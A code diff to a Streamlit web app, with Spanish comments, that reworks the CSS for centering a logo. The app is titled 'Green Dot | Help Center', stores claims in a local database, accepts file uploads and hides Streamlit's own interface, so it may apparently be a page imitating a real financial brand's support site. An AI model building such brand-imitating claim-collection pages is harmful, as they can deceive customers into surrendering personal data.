@@ -5,7 +5,7 @@ import os
 import pandas as pd
 from datetime import datetime
 
-# VERSIÓN 1.0.1 - PRODUCCIÓN CON LOGO CENTRADO
+# Configuración de Rutas
 DB_NAME = "claims.db"
 UPLOAD_DIR = "uploads"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -24,26 +24,24 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# CSS Consolidado con Logo Centrado
+# CSS PARA CENTRADO ABSOLUTO
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
     header, footer, .stDeployButton, [data-testid='stHeader'] { display: none !important; }
     
-    /* LOGO CENTRADO EN PC Y MÓVIL */
+    /* Forzar el contenedor del logo al centro */
     [data-testid="stImage"] {
-        display: flex !important;
-        justify-content: center !important;
-        align-items: center !important;
+        display: block !important;
         margin-left: auto !important;
         margin-right: auto !important;
-        width: 100% !important;
         text-align: center !important;
     }
     
     [data-testid="stImage"] img {
-        width: 250px !important; 
-        margin: 0 auto !important;
+        display: inline-block !important;
+        width: 250px !important;
+        height: auto !important;
     }
 
     @media (max-width: 768px) {
@@ -54,6 +52,7 @@ st.markdown("""<style>
     .legal-container { font-size: 11px; color: #777; text-align: center; margin-top: 50px; border-top: 1px solid #222; padding-top: 20px; }
 </style>""", unsafe_allow_html=True)
 
+# Mostrar Logo centrado
 if os.path.exists("logo.svg"): 
     st.image("logo.svg")
 
